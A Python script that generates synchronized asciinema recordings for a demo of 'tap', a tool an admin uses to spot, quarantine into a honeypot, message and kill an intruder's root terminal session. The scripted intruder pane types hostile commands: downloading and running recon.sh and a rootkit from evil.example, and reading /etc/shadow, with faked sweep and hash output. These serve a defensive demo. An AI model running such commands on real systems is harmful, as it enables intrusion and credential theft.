#!/usr/bin/env python3
"""
Generate the side-by-side quarantine demo casts from a single storyboard.

Produces:
  site/admin.cast   — what the admin sees in their terminal
  site/hacker.cast  — what the suspect sees on the right side

Both casts share a timeline — events on each side are emitted at the same
absolute timestamps where they need to coincide (admin attaches at t=10s,
hacker is busy doing recon at t=10s, etc). The page-side JS plays both
players together and corrects drift; this generator just makes sure the
timestamps line up.

Run:
  python3 scripts/build-demo-casts.py
"""

import json
import os
import random

# Both panes are 80x24 (standard) so each cast renders at a comfortable
# size in the dual-player layout (~half-page each on desktop, full-width
# stacked on mobile).
W, H = 80, 24

# Reproducible jitter so we get the same casts every regeneration.
random.seed(7)

events = []  # list of (t: float, side: str, data: str)


def at(t, side, data):
    events.append((t, side, data))


def type_str(t0, side, s, cps=12, jitter=0.45):
    """
    Stream `s` one character at a time starting at t0, with realistic-
    feeling delays. Returns the timestamp of the last keystroke.
    """
    t = t0
    for ch in s:
        at(t, side, ch)
        delay = (1.0 / cps) * (1 + random.uniform(-jitter, jitter))
        t += max(0.02, delay)
    return t


# ───── Color helpers ─────
RESET = "\x1b[0m"
BOLD = "\x1b[1m"
DIM = "\x1b[2m"
REV = "\x1b[7m"


def fg(code):
    return f"\x1b[{code}m"


GREEN = fg(32)
RED = fg(31)
BLUE = fg(34)
YELLOW = fg(33)
CYAN = fg(36)
GREY = fg(90)


def alice_prompt():
    """alice's pre-sudo prompt — only used briefly at t=0 before she sudoes."""
    return f"{BOLD}{GREEN}alice@web-prod{RESET}:{BOLD}{BLUE}~{RESET}$ "


def admin_prompt():
    """alice has sudo'd to root — same visual as the suspect's prompt.
    Disambiguation between the two panes happens via the title bar above
    each player, not the prompt string."""
    return f"{BOLD}{RED}root@web-prod{RESET}:{BOLD}{BLUE}~{RESET}# "


def hacker_prompt():
    """ops escalated to euid 0 — bash relabels itself as root@. The picker
    still shows ops as the loginuid, which is how the operator spots the
    privesc."""
    return f"{BOLD}{RED}root@web-prod{RESET}:{BOLD}{BLUE}~{RESET}# "


# ───── Storyboard ─────
#
# Time budget ~70s. Beat list:
#   t=0..5:   hacker establishes presence + first recon
#   t=5..10:  admin opens picker, sees hacker's session
#   t=10..16: admin attaches, watches hacker do incriminating stuff
#   t=16..20: admin detaches, quarantines
#   t=20..25: admin re-attaches into the impostor view
#   t=25..30: admin sends "what are you doing?" message
#   t=30..50: hacker panics, types incriminating reply, admin watches
#   t=50..60: admin detaches, kills, picker refreshes
#   t=60..65: clean state on both sides

# Initial prompts. Admin starts as alice (regular user); she sudoes to
# root before running tap, since only root can attach to other root ptys.
ADMIN = "admin"
HACKER = "hacker"
at(0.0, ADMIN,  "\x1b[2J\x1b[H" + alice_prompt())
at(0.0, HACKER, "\x1b[2J\x1b[H" + hacker_prompt())

# ── Admin: sudo -i to become root ──
# In real life alice was paged about an unknown root session on web-prod;
# she ssh'd in and is sudo'ing now to investigate.
t_sudo = 1.5
t_sudo = type_str(t_sudo, ADMIN, "sudo -i", cps=14)
at(t_sudo + 0.20, ADMIN, "\r\n")
at(t_sudo + 0.40, ADMIN, "[sudo] password for alice: ")
at(t_sudo + 1.20, ADMIN, "\r\n")
at(t_sudo + 1.30, ADMIN, "Last login: Mon Apr 30 14:03:11 2026 from 10.0.0.42\r\n")
at(t_sudo + 1.40, ADMIN, admin_prompt())

# ── Hacker: wget recon tool ──
t = 1.0
t = type_str(t, HACKER, "wget http://evil.example/recon.sh", cps=14)
at(t + 0.20, HACKER, "\r\n")
at(t + 0.45, HACKER, f"--2026-04-30 14:00:01--  http://evil.example/recon.sh\r\n")
at(t + 0.65, HACKER, f"Resolving evil.example... 192.0.2.66\r\n")
at(t + 0.90, HACKER, f"Connecting to evil.example|192.0.2.66|:80... connected.\r\n")
at(t + 1.10, HACKER, f"HTTP request sent, awaiting response... 200 OK\r\n")
at(t + 1.25, HACKER, f"Length: 8421 (8.2K) [application/x-sh]\r\n")
at(t + 1.40, HACKER, f"Saving to: 'recon.sh'\r\n\r\n")
at(t + 1.55, HACKER, f"recon.sh           100%[==========>]   8.22K  --.-KB/s    in 0.001s\r\n\r\n")
at(t + 1.70, HACKER, f"2026-04-30 14:00:02 (8.21 MB/s) - 'recon.sh' saved\r\n\r\n")
t = t + 1.85
at(t, HACKER, hacker_prompt())

# ── Admin: opens picker ──
t_admin = 4.5
t_admin = type_str(t_admin, ADMIN, "tap", cps=10)
at(t_admin + 0.30, ADMIN, "\r\n")

# Picker frame appears
PICKER_HEADER = (
    "\x1b[2J\x1b[H"
    f"{BOLD}┌── tap — terminal session picker ─────────────────────────────────────────────┐{RESET}\r\n"
    f"{BOLD}│{RESET} pty   user                comm        age      idle                         {BOLD}│{RESET}\r\n"
)
PICKER_FOOTER = (
    f"{BOLD}└──────────────────────────────────────────────────────────────────────────────┘{RESET}\r\n"
    f"{DIM}2 session(s) — ↑/↓ select  Enter=connect  l=lock  Q=quarantine  x=kill  q=quit{RESET}"
)


def picker_body(highlight_root=True, quarantined=False):
    """Render a snapshot of the picker body (rows minus header/footer).

    Each row shows `loginuser(euid)`. alice(0) is alice sudo'd to root —
    expected for an operator. ops(0) is suspicious: ops is a service
    account that should never have euid 0. The mismatch (in red) is the
    visual tell of a privesc."""
    rows = []
    # alice's row — operator's own session (running tap right now).
    rows.append(
        f"{BOLD}│{RESET}    3   alice(0)           tap         82s      0ms                         {BOLD}│{RESET}"
    )
    # ops's row — login=ops but euid=0. Username in red flags the privesc.
    label = "🎭  4" if quarantined else "    4"
    line = f"{label}   {RED}ops(0){RESET}              bash        45s      0ms                       "
    if highlight_root:
        line = REV + line + RESET
    rows.append(f"{BOLD}│{RESET} {line}{BOLD}│{RESET}")
    # spacer
    rows.append(f"{BOLD}│{RESET}                                                                              {BOLD}│{RESET}")
    # preview header
    rows.append(f"{BOLD}│{RESET}  {DIM}preview of pty 4 (ops → euid 0) ── live{RESET}                                    {BOLD}│{RESET}")
    return "\r\n".join(rows) + "\r\n"


def emit_picker(t, highlight_root=True, quarantined=False, preview_lines=None):
    """Write the full picker frame."""
    parts = [PICKER_HEADER, picker_body(highlight_root, quarantined)]
    # Preview area: 6 lines of fake snapshot inside the box. Pad to width.
    preview = preview_lines or ["", "", "", "", "", ""]
    for line in preview[:6]:
        # Truncate to fit inside the box (74 chars of inner width).
        s = line[:74].ljust(74)
        parts.append(f"{BOLD}│{RESET}  {s}{BOLD}│{RESET}\r\n")
    while len(preview) < 6:
        preview.append("")
    parts.append(PICKER_FOOTER)
    at(t, ADMIN, "".join(parts))


# Picker first appears around t=5.0 after the user types `tap` + Enter.
t_picker_show = t_admin + 0.45
emit_picker(
    t_picker_show,
    highlight_root=True,
    preview_lines=[
        "--2026-04-30 14:00:02--  http://evil.example/recon.sh",
        "Connecting to evil.example|192.0.2.66|:80... connected.",
        "HTTP request sent, awaiting response... 200 OK",
        f"recon.sh           100%[==========>]   8.22K  --.-KB/s    in 0.001s",
        "2026-04-30 14:00:02 (8.21 MB/s) - 'recon.sh' saved",
        f"{RED}root@web-prod{RESET}:~# ",
    ],
)

# ── Hacker: chmod + run ──
t = 5.0
t = type_str(t, HACKER, "chmod +x recon.sh && ./recon.sh", cps=14)
at(t + 0.20, HACKER, "\r\n")
at(t + 0.30, HACKER, f"{CYAN}[recon]{RESET} starting subnet sweep on 10.0.0.0/24...\r\n")
at(t + 0.50, HACKER, f"{CYAN}[recon]{RESET} 10.0.0.1 (gw)    open: 22 80 443\r\n")
at(t + 0.65, HACKER, f"{CYAN}[recon]{RESET} 10.0.0.5 (db)    open: 22 5432 6379\r\n")
at(t + 0.80, HACKER, f"{CYAN}[recon]{RESET} 10.0.0.7 (auth)  open: 22 443 8443\r\n")
at(t + 0.95, HACKER, f"{CYAN}[recon]{RESET} 10.0.0.12 (api)  open: 22 80 443 9090\r\n")
at(t + 1.10, HACKER, f"{CYAN}[recon]{RESET} sweep complete: 4 hosts, 13 open ports\r\n\r\n")
t = t + 1.30
at(t, HACKER, hacker_prompt())

# ── Admin: refresh picker preview to reflect new hacker state ──
t_admin2 = 8.0
emit_picker(
    t_admin2,
    highlight_root=True,
    preview_lines=[
        f"{CYAN}[recon]{RESET} 10.0.0.5 (db)    open: 22 5432 6379",
        f"{CYAN}[recon]{RESET} 10.0.0.7 (auth)  open: 22 443 8443",
        f"{CYAN}[recon]{RESET} 10.0.0.12 (api)  open: 22 80 443 9090",
        f"{CYAN}[recon]{RESET} sweep complete: 4 hosts, 13 open ports",
        "",
        f"{RED}root@web-prod{RESET}:~# ",
    ],
)

# ── Hacker: starts something more incriminating ──
# Recon prompt has been visible since ~t=8.6, so the cursor sits at a
# fresh prompt before this typing begins.
t = 9.0
t = type_str(t, HACKER, "cat /etc/shadow", cps=14)
at(t + 0.20, HACKER, "\r\n")

# ── Admin: presses Enter to attach ──
t_attach = 10.5
at(t_attach, ADMIN, "\x1b[2J\x1b[H")
at(t_attach + 0.05, ADMIN, f"{DIM}[tap connect pty=4 root@web-prod — Ctrl-T to detach]{RESET}\r\n")
# Mirror what's on hacker's screen
at(t_attach + 0.10, ADMIN, hacker_prompt() + "cat /etc/shadow\r\n")

# Hacker continues — output of cat /etc/shadow flows to both screens
t = 11.0
shadow_lines = [
    f"root:$6$xS9Lk$abc...truncated.../:19710:0:99999:7:::\r\n",
    f"alice:$6$pY3xQ$def...truncated.../:19710:0:99999:7:::\r\n",
    f"bob:$6$Ld8mR$ghi...truncated.../:19710:0:99999:7:::\r\n",
    f"_apt:*:19710:0:99999:7:::\r\n",
    f"systemd-network:*:19710:0:99999:7:::\r\n",
]
for i, line in enumerate(shadow_lines):
    at(t + i * 0.18, HACKER, line)
    at(t + i * 0.18, ADMIN, line)
t_after_cat = t + len(shadow_lines) * 0.18 + 0.10
at(t_after_cat, HACKER, hacker_prompt())
at(t_after_cat, ADMIN, hacker_prompt())

# Hacker types another bad command
t = t_after_cat + 0.6
typed = "wget http://evil.example/rootkit.tar.gz"
for ch in typed:
    at(t, HACKER, ch)
    at(t, ADMIN, ch)
    delay = (1.0 / 14) * (1 + random.uniform(-0.4, 0.4))
    t += max(0.02, delay)

# ── Admin has seen enough: Ctrl-T detach ──
# (We don't render Ctrl-T as a character — just transition the admin's view
# back to the picker.)
t_detach = t + 0.6
emit_picker(
    t_detach,
    highlight_root=True,
    preview_lines=[
        "alice:$6$pY3xQ$def...truncated.../:19710:0:99999:7:::",
        "bob:$6$Ld8mR$ghi...truncated.../:19710:0:99999:7:::",
        "_apt:*:19710:0:99999:7:::",
        "",
        f"{RED}root@web-prod{RESET}:~# wget http://evil.example/rootkit.tar.gz",
        "",
    ],
)

# ── Admin: presses Q for quarantine confirmation ──
t_q_prompt = t_detach + 1.4
# Replace the bottom hint line with the confirmation prompt
prompt_replace = (
    "\x1b[24;1H\x1b[K"
    f"{YELLOW}quarantine pty 4? press y to confirm — switches them into a sandboxed honeypot (reversible){RESET}"
)
at(t_q_prompt, ADMIN, prompt_replace)

# Admin types y
t_q_confirm = t_q_prompt + 1.2
at(t_q_confirm, ADMIN, "")  # no visible char — y was pressed but the picker eats it

# Picker re-renders with 🎭
emit_picker(
    t_q_confirm + 0.3,
    highlight_root=True,
    quarantined=True,
    preview_lines=[
        f"{GREY}quarantined pty 4 — impostor running{RESET}",
        f"{GREY}original shell SIGSTOPped{RESET}",
        "",
        "",
        "",
        "",
    ],
)

# Hacker side: at the moment of quarantine, their wget output silently
# stops. The honeypot bash takes over with a fresh prompt that looks
# exactly like the real one. They don't notice immediately.
t_hop_takeover = t_q_confirm + 0.4
at(t_hop_takeover, HACKER, "\r\n")
at(t_hop_takeover + 0.05, HACKER, hacker_prompt())

# ── Hacker: types `id` (in the honeypot now) ──
t = t_hop_takeover + 1.5
t = type_str(t, HACKER, "id", cps=12)
at(t + 0.15, HACKER, "\r\n")
at(t + 0.30, HACKER, "uid=0(root) gid=0(root) groups=0(root)\r\n")
at(t + 0.45, HACKER, hacker_prompt())

# ── Admin: re-attaches to the impostor view ──
t_reattach = t + 0.9
at(t_reattach, ADMIN, "\x1b[2J\x1b[H")
at(t_reattach + 0.05, ADMIN,
   f"{DIM}[tap connect pty=4 root@web-prod (quarantined 🎭) — Ctrl-T to detach]{RESET}\r\n")
at(t_reattach + 0.10, ADMIN, hacker_prompt() + "id\r\n")
at(t_reattach + 0.15, ADMIN, "uid=0(root) gid=0(root) groups=0(root)\r\n")
at(t_reattach + 0.20, ADMIN, hacker_prompt())

# ── Admin: presses Ctrl-G, types message ──
# Show the bottom-row compose prompt; admin types the question.
t_compose_open = t_reattach + 1.2
# Move cursor to last row, paint reverse-video prompt
at(t_compose_open, ADMIN,
   f"\x1b[24;1H\x1b[K{REV}{YELLOW} admin > {RESET}{YELLOW}")
t = t_compose_open + 0.3
t = type_str(t, ADMIN, "what are you doing on this machine?", cps=10)
# Admin presses Enter; message is sent. Compose prompt clears.
t_send = t + 0.4
at(t_send, ADMIN, RESET + "\x1b[24;1H\x1b[K")  # clear prompt row

# ── Hacker: admin message flashes onto their terminal ──
ADMIN_MSG = (
    "\r\n\x07"  # bell — get attention
    f"{REV}{YELLOW}  admin: alice  {RESET}\r\n"
    f"{YELLOW}  what are you doing on this machine?{RESET}\r\n"
    "\r\n"
)
at(t_send + 0.05, HACKER, ADMIN_MSG)
at(t_send + 0.10, HACKER, hacker_prompt())
# Mirror on admin side too (admin sees the message they sent appear on the
# hacker's screen, since they're attached and the daemon writes to /dev/pts/N).
at(t_send + 0.05, ADMIN, ADMIN_MSG)
at(t_send + 0.10, ADMIN, hacker_prompt())

# ── Hacker: panics. Pause, then start typing. ──
t_react = t_send + 2.5  # 2.5s of dead air — visible cursor blink
# First attempt: types "nothi" then backspaces it all
t = t_react
typed = "nothi"
for ch in typed:
    at(t, HACKER, ch)
    at(t, ADMIN, ch)
    t += 0.18
# Backspaces (slowly, like they're rethinking)
for _ in range(len(typed)):
    at(t, HACKER, "\x08 \x08")
    at(t, ADMIN, "\x08 \x08")
    t += 0.10
t += 0.4

# Real reply, slow
typed = "i was just looking around, im sorry"
for ch in typed:
    at(t, HACKER, ch)
    at(t, ADMIN, ch)
    delay = (1.0 / 9) * (1 + random.uniform(-0.5, 0.5))
    t += max(0.04, delay)

t_reply_done = t + 0.6

# ── Admin: detaches, kills ──
t_admin_detach = t_reply_done + 1.0
emit_picker(
    t_admin_detach,
    highlight_root=True,
    quarantined=True,
    preview_lines=[
        f"{RED}root@web-prod{RESET}:~# id",
        "uid=0(root) gid=0(root) groups=0(root)",
        f"{RED}root@web-prod{RESET}:~# ",
        f"{REV}{YELLOW}  admin: alice  {RESET}",
        f"{YELLOW}  what are you doing on this machine?{RESET}",
        f"{RED}root@web-prod{RESET}:~# i was just looking around, im sorry",
    ],
)

# Admin presses x → confirmation
t_kill_prompt = t_admin_detach + 1.0
at(t_kill_prompt, ADMIN,
   "\x1b[24;1H\x1b[K"
   f"{YELLOW}kill pty 4? press y to confirm (SIGHUP), X to force (SIGKILL), any other key to cancel{RESET}")

# Admin presses y → kill fires
t_kill = t_kill_prompt + 0.9
at(t_kill, ADMIN,
   "\x1b[24;1H\x1b[K"
   f"{GREEN}sent SIGHUP to pty 4{RESET}")

# Hacker side: bash exits, ssh connection drops
t_drop = t_kill + 0.2
at(t_drop, HACKER, "\r\nlogout\r\n")
at(t_drop + 0.3, HACKER, "Connection to web-prod closed by remote host.\r\n")
at(t_drop + 0.6, HACKER, "Connection to web-prod closed.\r\n")
at(t_drop + 0.9, HACKER, f"{DIM}[ session ended ]{RESET}\r\n")

# Picker refreshes — only alice's session left
t_picker_after = t_kill + 0.6
at(t_picker_after, ADMIN, "\x1b[2J\x1b[H")
at(t_picker_after + 0.05, ADMIN, PICKER_HEADER)
at(t_picker_after + 0.10, ADMIN,
   f"{BOLD}│{RESET} {REV}    3   alice(0)           tap         87s      0ms                         {RESET}{BOLD}│{RESET}\r\n")
at(t_picker_after + 0.15, ADMIN,
   f"{BOLD}│{RESET}                                                                              {BOLD}│{RESET}\r\n")
at(t_picker_after + 0.20, ADMIN,
   f"{BOLD}│{RESET}  {DIM}preview of pty 3 (alice → euid 0) ── live{RESET}                                  {BOLD}│{RESET}\r\n")
at(t_picker_after + 0.25, ADMIN,
   f"{BOLD}│{RESET}                                                                              {BOLD}│{RESET}\r\n")
at(t_picker_after + 0.30, ADMIN,
   f"{BOLD}│{RESET}  {RED}root@web-prod{RESET}:~# tap                                                        {BOLD}│{RESET}\r\n")
at(t_picker_after + 0.35, ADMIN,
   f"{BOLD}│{RESET}                                                                              {BOLD}│{RESET}\r\n")
at(t_picker_after + 0.40, ADMIN,
   f"{BOLD}│{RESET}                                                                              {BOLD}│{RESET}\r\n")
at(t_picker_after + 0.45, ADMIN, PICKER_FOOTER)

# End: small beat, then both terminals settle.
T_END = t_picker_after + 3.0
at(T_END, ADMIN, "")  # no-op final marker
at(T_END, HACKER, "")


# ───── Emit cast files ─────
def write_cast(side, path):
    side_events = sorted([(t, d) for (t, s, d) in events if s == side], key=lambda e: e[0])
    header = {
        "version": 2,
        "width": W,
        "height": H,
        "timestamp": 1777570000,  # arbitrary
        "env": {"SHELL": "/bin/bash", "TERM": "xterm-256color"},
    }
    with open(path, "w") as f:
        f.write(json.dumps(header) + "\n")
        for t, data in side_events:
            if not data:
                continue
            f.write(json.dumps([round(t, 4), "o", data]) + "\n")


here = os.path.dirname(os.path.abspath(__file__))
site = os.path.join(here, "..", "site")
write_cast(ADMIN, os.path.join(site, "admin.cast"))
write_cast(HACKER, os.path.join(site, "hacker.cast"))

# Print the total duration so the page can size things right.
duration = max(e[0] for e in events)
print(f"wrote site/admin.cast and site/hacker.cast (~{duration:.1f}s total)")
